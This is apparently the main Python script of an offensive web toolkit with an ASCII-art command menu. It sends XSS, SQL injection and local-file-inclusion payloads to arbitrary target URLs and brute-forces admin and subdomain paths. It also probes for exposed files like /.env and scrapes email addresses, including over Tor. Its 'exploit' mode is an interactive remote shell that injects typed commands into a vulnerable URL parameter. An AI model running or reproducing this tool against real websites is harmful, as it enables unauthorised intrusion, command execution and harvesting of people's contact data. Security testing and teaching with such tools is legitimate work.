from modules.modules import setup_option
setup_option()
import sys, time, os, json, re, requests
from urllib.parse import urljoin
from bs4 import BeautifulSoup as bs
from pprint import pprint
from bs4 import BeautifulSoup
from colorama import Fore, init

from payloads.endpoint import endpoints
from payloads.admin import admin
from payloads.subdomain import path
from payloads.xss import payloads_xss
from payloads.sqli import sqli_payloads
from payloads.lfi import parameters, commands

from scripts.tor_email_finder import file_darkweb
from scripts.tor_web_scraper import tor_scraper
from scripts.tor_xss_scanner import xss_scanner
from scripts.tor_sql_scanner import sql_injection_scanner
from scripts.tor_email import grab_email
from scripts.tor_path_finder import path_finder

from scripts.payload.admin_payloads import payload_admin
from scripts.payload.subdomain_payloads import subdomain

init()

class log:
    wait = f"{Fore.LIGHTWHITE_EX}({Fore.LIGHTCYAN_EX} * {Fore.LIGHTWHITE_EX})"
    success = f"{Fore.LIGHTWHITE_EX}({Fore.LIGHTGREEN_EX} ✓ {Fore.LIGHTWHITE_EX})"
    error = f"{Fore.LIGHTWHITE_EX}({Fore.LIGHTRED_EX} X {Fore.LIGHTWHITE_EX})"
    info = f"{Fore.LIGHTWHITE_EX}({Fore.LIGHTBLUE_EX} i {Fore.LIGHTWHITE_EX})"
    warning = f"{Fore.LIGHTWHITE_EX}({Fore.YELLOW} ! {Fore.LIGHTWHITE_EX})"
class ascii:
    def title(self):
        os.system('cls || clear')
        sys.stdout.write(f'''
{Fore.LIGHTWHITE_EX}                                                 ,▄▄≡∞∞w▄,
                                             ▄*"-          "ⁿw,
                                          ╓P"                  ▀▄
                                         ▀ .▄Γ  .─¿"/]└`      ▄, ▀▄
                                       ,▀╓▌█▌    "─  m▄▒─     ╘█Ü▌,▌
{Fore.LIGHTCYAN_EX}▄██ ███ ██▄ ████████ ▄▄▄███▄▄ ███  ▄█▄,{Fore.LIGHTWHITE_EX}▌▐▐█▌         ]▀         ███ ▌{Fore.LIGHTCYAN_EX}▐████████
{Fore.LIGHTCYAN_EX}▐██▐██████" ███▀▀▀▀▀ ███▀▀███ ███▄███▀{Fore.LIGHTWHITE_EX}▐]▐█▀    ]   ``▀```       ▐██l▐{Fore.LIGHTCYAN_EX} ▀▀███▀▀▀
{Fore.LIGHTCYAN_EX}▐█████████ j██████▌  ███████▀ ██████ {Fore.LIGHTWHITE_EX} █▐▌▄▌ ───▒─s▄█ █⌐▓▄p;────["█y█▐ {Fore.LIGHTCYAN_EX}  ███
{Fore.LIGHTCYAN_EX}▐████████U ▐███▀▀▀-  ███▀███▌ ██████▄ {Fore.LIGHTWHITE_EX}▐▐▀█▐    ]████ █ ▐███▌   `▓██▄▐ {Fore.LIGHTCYAN_EX}  ███
{Fore.LIGHTCYAN_EX} ████████  ▐███████▌▐███████▌ ███ ▀███ {Fore.LIGHTWHITE_EX}▌▀██D/'`▐████████████ "┘ƒ█▄█¬▌  {Fore.LIGHTCYAN_EX} ███
{Fore.LIGHTCYAN_EX} ▀▀▀ ▀▀▀"  ╘▀▀▀▀▀▀▀"╚▀▀▀▀▀▀╙  ▀▀▀  ╙▀  {Fore.LIGHTWHITE_EX}╙▄N█▌█▄¿█████████████─¿█H█▄▀▀ {Fore.LIGHTCYAN_EX}   ▀▀▀
{Fore.LIGHTWHITE_EX}                                         N└█▀▀▀█████████████▀Å▀▀▀▄▀
                                          ╙W,▀████████████████▀▄▀
                                             ▀∞▄;▐████████ ▄▄²"
                                                 '▀▀▀▀▀▀▀▀-       
''')
    def help(self):
        sys.stdout.write(f'''
{Fore.LIGHTCYAN_EX} >→ {Fore.LIGHTWHITE_EX} exploit       {Fore.LIGHTCYAN_EX}   >=─►{Fore.LIGHTWHITE_EX}   Exploit vulnerabilities
{Fore.LIGHTCYAN_EX} >→ {Fore.LIGHTWHITE_EX} subdomain     {Fore.LIGHTCYAN_EX}   >=─►{Fore.LIGHTWHITE_EX}   Subdomain Scanner
{Fore.LIGHTCYAN_EX} >→ {Fore.LIGHTWHITE_EX} admin         {Fore.LIGHTCYAN_EX}   >=─►{Fore.LIGHTWHITE_EX}   Admin Finder Scanner
{Fore.LIGHTCYAN_EX} >→ {Fore.LIGHTWHITE_EX} xss           {Fore.LIGHTCYAN_EX}   >=─►{Fore.LIGHTWHITE_EX}   XSS Vulnerability Scanner 
{Fore.LIGHTCYAN_EX} >→ {Fore.LIGHTWHITE_EX} sql           {Fore.LIGHTCYAN_EX}   >=─►{Fore.LIGHTWHITE_EX}   SQL Injection Scanner
{Fore.LIGHTCYAN_EX} >→ {Fore.LIGHTWHITE_EX} clickjacking  {Fore.LIGHTCYAN_EX}   >=─►{Fore.LIGHTWHITE_EX}   ClickJacking Scanner
{Fore.LIGHTCYAN_EX} >→ {Fore.LIGHTWHITE_EX} miscon        {Fore.LIGHTCYAN_EX}   >=─►{Fore.LIGHTWHITE_EX}   Misconfiguration Scanner
{Fore.LIGHTCYAN_EX} >→ {Fore.LIGHTWHITE_EX} sims          {Fore.LIGHTCYAN_EX}   >=─►{Fore.LIGHTWHITE_EX}   Security Misconfiguration Scanner
{Fore.LIGHTCYAN_EX} >→ {Fore.LIGHTWHITE_EX} lfi           {Fore.LIGHTCYAN_EX}   >=─►{Fore.LIGHTWHITE_EX}   Local File Inclusion
{Fore.LIGHTCYAN_EX} >→ {Fore.LIGHTWHITE_EX} email         {Fore.LIGHTCYAN_EX}   >=─►{Fore.LIGHTWHITE_EX}   Show emails on the website
{Fore.LIGHTCYAN_EX} >→ {Fore.LIGHTWHITE_EX} file          {Fore.LIGHTCYAN_EX}   >=─►{Fore.LIGHTWHITE_EX}   View website files

{Fore.LIGHTCYAN_EX}[{Fore.LIGHTWHITE_EX}Dark Web{Fore.LIGHTCYAN_EX}]
{Fore.LIGHTCYAN_EX} >→ {Fore.LIGHTWHITE_EX} tor file      {Fore.LIGHTCYAN_EX}   >=─►{Fore.LIGHTWHITE_EX}   View website files
{Fore.LIGHTCYAN_EX} >→ {Fore.LIGHTWHITE_EX} tor scrape    {Fore.LIGHTCYAN_EX}   >=─►{Fore.LIGHTWHITE_EX}   Web Scraper
{Fore.LIGHTCYAN_EX} >→ {Fore.LIGHTWHITE_EX} tor xss       {Fore.LIGHTCYAN_EX}   >=─►{Fore.LIGHTWHITE_EX}   XSS Vulnerability Scanner
{Fore.LIGHTCYAN_EX} >→ {Fore.LIGHTWHITE_EX} tor sql       {Fore.LIGHTCYAN_EX}   >=─►{Fore.LIGHTWHITE_EX}   SQL Injection Scanner
{Fore.LIGHTCYAN_EX} >→ {Fore.LIGHTWHITE_EX} tor email     {Fore.LIGHTCYAN_EX}   >=─►{Fore.LIGHTWHITE_EX}   Show emails on the website
{Fore.LIGHTCYAN_EX} >→ {Fore.LIGHTWHITE_EX} tor admin     {Fore.LIGHTCYAN_EX}   >=─►{Fore.LIGHTWHITE_EX}   Admin Finder Scanner
{Fore.LIGHTCYAN_EX} >→ {Fore.LIGHTWHITE_EX} tor subdomain {Fore.LIGHTCYAN_EX}   >=─►{Fore.LIGHTWHITE_EX}   Admin Finder Scanner

{Fore.LIGHTCYAN_EX} >→ {Fore.LIGHTWHITE_EX} clear         {Fore.LIGHTCYAN_EX}   >=─►{Fore.LIGHTWHITE_EX}   Clear screen
{Fore.LIGHTCYAN_EX} >→ {Fore.LIGHTWHITE_EX} help          {Fore.LIGHTCYAN_EX}   >=─►{Fore.LIGHTWHITE_EX}   Show commands

''')

def exploit_vulnerabilities_shell():
    web = input(f'{Fore.LIGHTWHITE_EX}URL (example: http://127.0.0.1:80/info?cmd){Fore.LIGHTCYAN_EX} >→{Fore.LIGHTGREEN_EX}  ')
    while True:
        command = input(f'{Fore.LIGHTGREEN_EX}SHELL{Fore.LIGHTCYAN_EX} >→{Fore.CYAN}  ')
        url = f'{web}={command}'
        resp = requests.get(url, timeout=10)
        print(log.success + f' Response:{Fore.LIGHTCYAN_EX} ', resp.text)

def exploit_vulnerabilities(base_url, endpoints, command):
    for endpoint in endpoints:
        url = f"{base_url}{endpoint}={command}"
        try:
            response = requests.get(url, timeout=10)
            if response.status_code == 200:
                print(log.success + f"{Fore.LIGHTCYAN_EX} {url}{Fore.LIGHTWHITE_EX}  |  {Fore.LIGHTMAGENTA_EX} {response.text}")
        except requests.RequestException as e:
            pass
    exploit_vulnerabilities_shell()

def check_paths(url, wordlist):
    paths_to_check = [line.strip() for line in wordlist if line.strip()]

    for path in paths_to_check:
        url = urljoin(url, path)
        time.sleep(0.5)
        response = requests.get(url)
        if response.status_code == 200:
            print(log.success + f"{Fore.LIGHTGREEN_EX} {url}{Fore.LIGHTCYAN_EX}  ]→{Fore.LIGHTWHITE_EX}  Status :{Fore.LIGHTMAGENTA_EX} {response.status_code}")

def find_forms(url):
    page_content = requests.get(url).content
    soup = bs(page_content, "html.parser")
    return soup.find_all("form")

def extract_form_details(form):
    details = {}
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def send_payload(form_details, url, payload):
    target_url = urljoin(url, form_details["action"])
    data = {}
    
    for input in form_details["inputs"]:
        input_name = input.get("name")
        if input_name:
            data[input_name] = payload if input["type"] in ["text", "search"] else ""

    print(log.success + f" Sending payload to {target_url}")
    print(log.success + f" Submitted data: {data}")
    
    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)

def xss_scan(url):
    forms = find_forms(url)
    print(log.success + f" Found {len(forms)} forms on {url}.")
    vulnerabilities_found = []

    for payload in payloads_xss:
        for form in forms:
            form_details = extract_form_details(form)
            response_content = send_payload(form_details, url, payload).content.decode()
            
            if payload in response_content:
                print(log.success + f" XSS detected on {url} with payload: {payload}")
                print(log.wait + " Form details:")
                pprint(form_details)

                result = {
                    'site': url,
                    'payload': payload,
                    'form_details': form_details,
                    'request_url': urljoin(url, form_details["action"]),
                    'method': form_details["method"]
                }
                vulnerabilities_found.append(result)

    if vulnerabilities_found:
        print()
        print(log.info + " Test Results:")
        print(json.dumps(vulnerabilities_found, indent=4))
    else:
        print(log.error + " No XSS vulnerabilities found.")

def sql_injection_scan(url):
    forms = find_forms(url)
    print(log.success + f" {len(forms)} forms found on {url}.")
    vulnerabilities_found = []

    for payload in sqli_payloads:
        for form in forms:
            form_details = extract_form_details(form)
            response_content = send_payload(form_details, url, payload).content.decode()
            
            if "error" in response_content.lower() or "syntax" in response_content.lower():
                print(log.success + f" SQL Injection detected on {url} with payload: {payload}")
                print(log.wait + f" Form details:")
                pprint(form_details)

                result = {
                    'site': url,
                    'payload': payload,
                    'form_details': form_details,
                    'request_url': urljoin(url, form_details["action"]),
                    'method': form_details["method"]
                }
                vulnerabilities_found.append(result)

    if vulnerabilities_found:
        print()
        print(log.wait + " Test results:")
        print(json.dumps(vulnerabilities_found, indent=4))
    else:
        print(log.error + " No SQL injection vulnerabilities found.")

def check_clickjacking(url):
    print(log.success + f" Checking Clickjacking protection for {url}...\n")

    clickjacking_info = {
        "site": url,
        "x_frame_options": None,
        "csp": None,
        "protection_status": None,
        "details": []
    }

    try:
        response = requests.get(url)

        clickjacking_info["x_frame_options"] = response.headers.get('X-Frame-Options')
        if clickjacking_info["x_frame_options"]:
            if clickjacking_info["x_frame_options"].lower() == 'deny':
                clickjacking_info["protection_status"] = "Protected"
                clickjacking_info["details"].append(
                    f"The site is protected against Clickjacking. The header 'X-Frame-Options: DENY' means this page cannot be displayed in a frame at all."
                )
            elif clickjacking_info["x_frame_options"].lower() == 'sameorigin':
                clickjacking_info["protection_status"] = "Protected"
                clickjacking_info["details"].append(
                    f"The site is protected against Clickjacking. The header 'X-Frame-Options: SAMEORIGIN' allows this page to be displayed in a frame only on the same origin."
                )
            else:
                clickjacking_info["protection_status"] = "Potentially Vulnerable"
                clickjacking_info["details"].append(
                    f"The site may be vulnerable to Clickjacking. The X-Frame-Options header is set to: {clickjacking_info['x_frame_options']}. This setting does not provide full protection."
                )
        else:
            clickjacking_info["protection_status"] = "Vulnerable"
            clickjacking_info["details"].append(
                "X-Frame-Options header is missing. This is a potential risk, as it may allow Clickjacking attacks."
            )
    
        clickjacking_info["csp"] = response.headers.get('Content-Security-Policy')
        if clickjacking_info["csp"]:
            if "frame-ancestors" in clickjacking_info["csp"]:
                clickjacking_info["protection_status"] = "Protected"
                clickjacking_info["details"].append(
                    "The site is protected against Clickjacking. The CSP header specifies valid parents that may embed this content."
                )
            else:
                clickjacking_info["protection_status"] = "Potentially Vulnerable"
                clickjacking_info["details"].append(
                    "The site may be vulnerable to Clickjacking. The CSP header does not specify 'frame-ancestors', leaving it open to potential attacks."
                )
        else:
            clickjacking_info["protection_status"] = "Vulnerable"
            clickjacking_info["details"].append(
                "Content-Security-Policy header is missing. This is a potential risk, as it may allow Clickjacking attacks."
            )

        print("\nClickjacking Data:")
        print(Fore.LIGHTMAGENTA_EX + f"{{")
        for key, value in clickjacking_info.items():
            print(f"{Fore.LIGHTWHITE_EX}  '{Fore.LIGHTCYAN_EX}{key}{Fore.LIGHTWHITE_EX}': '{Fore.LIGHTCYAN_EX}{value}{Fore.LIGHTWHITE_EX}'" if value is not None else f"{Fore.LIGHTWHITE_EX}  '{Fore.LIGHTMAGENTA_EX}{key}{Fore.LIGHTWHITE_EX}': '{Fore.LIGHTRED_EX}Not present{Fore.LIGHTWHITE_EX}',")
        print(Fore.LIGHTMAGENTA_EX + f"}}\n")

    except requests.RequestException as e:
        print(log.error + f" An error occurred during the request: {e}")


def check_misconfiguration(url):
    response = requests.get(url)
    if "Server" in response.headers:
        print(log.success + f" Server header is present: {response.headers['Server']}")
    else:
        print(log.error + " Server header is missing, which could indicate misconfiguration.")

def check_security_misconfiguration(url):
    sensitive_files = [
        "/.env",
        "/config.php",
        "/robots.txt",
        "/backup.zip",
    ]

    for file in sensitive_files:
        response = requests.get(url + file)
        if response.status_code == 200:
            print(log.warning + f" Sensitive file found: {url + file}")
        else:
            print(log.error + f" No sensitive file found: {url + file}")

def email2(url):
    try:
        response = requests.get(url)
        if response.status_code == 200:
            pattern = r'[\w\.-]+@[\w\.-]+'
            emails = set(re.findall(pattern, response.text))
            return list(emails)
    except requests.exceptions.RequestException as e:
        print(log.error + f" ERROR: {e}")

def LFI(url):
    for param in parameters:
        for payload in commands:
            target_url = url + f"{param}={payload}"
            try:
                response = requests.get(target_url)
                if response.status_code == 200:
                   print(log.wait + f" {target_url}")
                   print(log.success + f' RESPONSE :{Fore.LIGHTCYAN_EX} {response.text[:200]}')
                   print('\n')
                elif response.status_code == 500:
                   print(log.error + f" Server error with {param} and {payload} (code 500). This can be exploitable.")
            except requests.exceptions.RequestException as e:
                pass

if __name__ == '__main__':
    log = log()
    ascii1 = ascii()
    ascii1.title()
    while True:
        try:
            command = input(f'{Fore.LIGHTCYAN_EX})→{Fore.CYAN}  Webkit {Fore.LIGHTBLUE_EX}✗{Fore.LIGHTWHITE_EX}  ')
            if command == 'help' or command == '?':
                ascii1.help()
            elif command == 'cls' or command == 'clear':
                ascii1.title()
            elif command == 'exploit' or command == 'EXPLOIT':
                url = input(f'{Fore.LIGHTWHITE_EX}URL{Fore.LIGHTCYAN_EX} >→{Fore.LIGHTGREEN_EX}  ')
                if url.endswith('/'):
                   url = url[:-1]
                ans = input(f'{Fore.LIGHTWHITE_EX}Do you want to find the path Y/N{Fore.LIGHTCYAN_EX} >→{Fore.LIGHTGREEN_EX}  ')
                if ans == 'Y':
                    command = 'echo "Potential vulnerability detected!" '
                    exploit_vulnerabilities(url, endpoints, command)
                elif ans == 'N':
                    exploit_vulnerabilities_shell()
                else:
                    print(log.error + f" Invalid response. Please answer with 'Y' or 'N'.")    
            elif command == 'subdomain' or command == 'SUBDOMAIN':
                url = input(f'{Fore.LIGHTWHITE_EX}URL{Fore.LIGHTCYAN_EX} >→{Fore.LIGHTGREEN_EX}  ')
                wordlist = path
                check_paths(url, wordlist) 
            elif command == 'admin' or command == 'ADMIN':
                url = input(f'{Fore.LIGHTWHITE_EX}URL{Fore.LIGHTCYAN_EX} >→{Fore.LIGHTGREEN_EX}  ')
                wordlist = admin
                check_paths(url, wordlist) 
            elif command == 'xss' or command == 'XSS':
                url = input(f'{Fore.LIGHTWHITE_EX}URL{Fore.LIGHTCYAN_EX} >→{Fore.LIGHTGREEN_EX}  ')
                try:
                   xss_scan(url)
                except requests.RequestException as e:
                   print(log.error + f" An error occurred during the request: {e}")
            elif command == 'sql' or command == 'SQL':
                url = input(f'{Fore.LIGHTWHITE_EX}URL{Fore.LIGHTCYAN_EX} >→{Fore.LIGHTGREEN_EX}  ')
                try:
                   sql_injection_scan(url)
                except requests.RequestException as e:
                   print(log.error + f" An error occurred during the request: {e}")
            elif command == 'clickjacking' or command == 'CLICKJACKING':
                url = input(f'{Fore.LIGHTWHITE_EX}URL{Fore.LIGHTCYAN_EX} >→{Fore.LIGHTGREEN_EX}  ')
                check_clickjacking(url)
            elif command == 'miscon' or command == 'MISCON':
                url = input(f'{Fore.LIGHTWHITE_EX}URL{Fore.LIGHTCYAN_EX} >→{Fore.LIGHTGREEN_EX}  ')
                check_misconfiguration(url)
            elif command == 'sims' or command == 'SIMS':
                url = input(f'{Fore.LIGHTWHITE_EX}URL{Fore.LIGHTCYAN_EX} >→{Fore.LIGHTGREEN_EX}  ')
                if url.endswith('/'):
                   url = url[:-1]
                check_security_misconfiguration(url)
            elif command == 'email' or command == 'EMAIL':
                url = input(f'{Fore.LIGHTWHITE_EX}URL{Fore.LIGHTCYAN_EX} >→{Fore.LIGHTGREEN_EX}  ')
                emails = email2(url)
                if emails:
                    print(log.success + f" Email addresses found on {url}:")
                    for email in emails:
                        print(log.success + f' Email : {email}')
                else:
                     print(log.error + f" No email address found on : {url}.")
            elif command == 'lfi' or command == 'LFI':
                url = input(f'{Fore.LIGHTWHITE_EX}URL{Fore.LIGHTCYAN_EX} >→{Fore.LIGHTGREEN_EX}  ')
                LFI(url)
            elif command == 'file' or command == 'FILE':
                url = input(f'{Fore.LIGHTWHITE_EX}URL{Fore.LIGHTCYAN_EX} >→{Fore.LIGHTGREEN_EX}  ')
                response = requests.get(url)
                if response.status_code == 200:
                    soup = BeautifulSoup(response.text, 'html.parser')
                    links = soup.find_all('a')
                    for link in links:
                        href = link.get('href')
                        if href and not href.endswith('/'):
                            print(log.success + f' {href}')
                        else:
                            print(log.error + f' {href}')
            elif command == 'tor file' or command == 'TOR FILE':
                url = input(f'{Fore.LIGHTWHITE_EX}URL{Fore.LIGHTCYAN_EX} >→{Fore.LIGHTGREEN_EX}  ')
                file_darkweb(url)
            elif command == 'tor scrape' or command == 'TOR SCRAPE':
                url = input(f'{Fore.LIGHTWHITE_EX}URL{Fore.LIGHTCYAN_EX} >→{Fore.LIGHTGREEN_EX}  ')
                tor_scraper(url)
            elif command == 'tor xss' or command == 'TOR XSS':
                url = input(f'{Fore.LIGHTWHITE_EX}URL{Fore.LIGHTCYAN_EX} >→{Fore.LIGHTGREEN_EX}  ')
                xss_scanner(url)
            elif command == 'tor sql' or command == 'TOR SQL':
                url = input(f'{Fore.LIGHTWHITE_EX}URL{Fore.LIGHTCYAN_EX} >→{Fore.LIGHTGREEN_EX}  ')
                sql_injection_scanner(url)
            elif command == 'tor email' or command == 'TOR EMAIL':
                url = input(f'{Fore.LIGHTWHITE_EX}URL{Fore.LIGHTCYAN_EX} >→{Fore.LIGHTGREEN_EX}  ')
                grab_email(url)
            elif command == 'tor admin' or command == 'TOR ADMIN':
                url = input(f'{Fore.LIGHTWHITE_EX}URL{Fore.LIGHTCYAN_EX} >→{Fore.LIGHTGREEN_EX}  ')
                wordlist = payload_admin
                path_finder(url, payload_admin)
            elif command == 'tor subdomain' or command == 'TOR SUBDOMAIN':
                url = input(f'{Fore.LIGHTWHITE_EX}URL{Fore.LIGHTCYAN_EX} >→{Fore.LIGHTGREEN_EX}  ')
                wordlist = payload_admin
                path_finder(url, subdomain)
            else:
                print(log.error + " Unknown command. type 'help' to see all commands.")
        except Exception as e:
            print(log.error + f" An error occurred: {str(e)}")